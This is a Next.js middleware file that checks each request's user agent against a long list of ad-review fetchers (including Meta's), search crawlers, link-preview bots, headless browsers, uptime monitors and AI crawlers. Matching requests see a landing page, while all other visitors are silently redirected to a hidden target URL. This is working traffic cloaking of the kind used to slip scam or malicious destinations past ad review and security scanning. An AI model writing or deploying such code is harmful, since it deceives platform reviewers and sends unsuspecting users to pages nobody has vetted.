import { NextResponse } from "next/server";

const SYNTHETIC_UA_PATTERNS = [
  "facebookexternalhit","facebookcatalog","meta-externalagent","meta-externalfetcher",
  "meta-externalads","meta-webindexer","googlebot","bingbot","slurp","duckduckbot",
  "baiduspider","yandexbot","sogou","exabot","ia_archiver","semrushbot","ahrefsbot",
  "dotbot","rogerbot","linkedinbot","embedly","quora link preview","showyoubot",
  "outbrain","pinterestbot","slackbot","vkshare","w3c_validator","redditbot","applebot",
  "whatsapp","flipboard","tumblr","bitlybot","skypeuripreview","nuzzel","discordbot",
  "qwantify","petalbot","bunyipbot","contxbot","seznambot","musobot","twitterbot",
  "x-bot","headlesschrome","puppeteer","playwright","phantom","selenium","crawl",
  "spider","bot/","bot ","datadog","uptimerobot","pingdom","site24x7","statuspage",
  "nagios","zabbix","monit","newrelic","appdynamics","catchpoint","gptbot",
  "chatgpt-user","claude-web","anthropic-ai","bytespider","ccbot","cohere-ai","perplexitybot",
];

export function middleware(request) {
  const redirectEnabled = process.env.REDIRECT_ENABLED === "true";
  const redirectTarget = process.env.REDIRECT_TARGET;

  // Always serve static pages directly
  const { pathname } = request.nextUrl;
  if (pathname === "/privacy.html" || pathname === "/terms.html") {
    return NextResponse.next();
  }

  if (!redirectEnabled || !redirectTarget) {
    return NextResponse.next();
  }

  const ua = (request.headers.get("user-agent") || "").toLowerCase();
  const isSynthetic = ua === "" || SYNTHETIC_UA_PATTERNS.some((p) => ua.includes(p));

  if (isSynthetic) {
    return NextResponse.next(); // show landing page to bots/crawlers
  }

  return NextResponse.redirect(redirectTarget, 302);
}

export const config = {
  matcher: ["/((?!_next|favicon.ico|logo.svg|style.css).*)"],
};
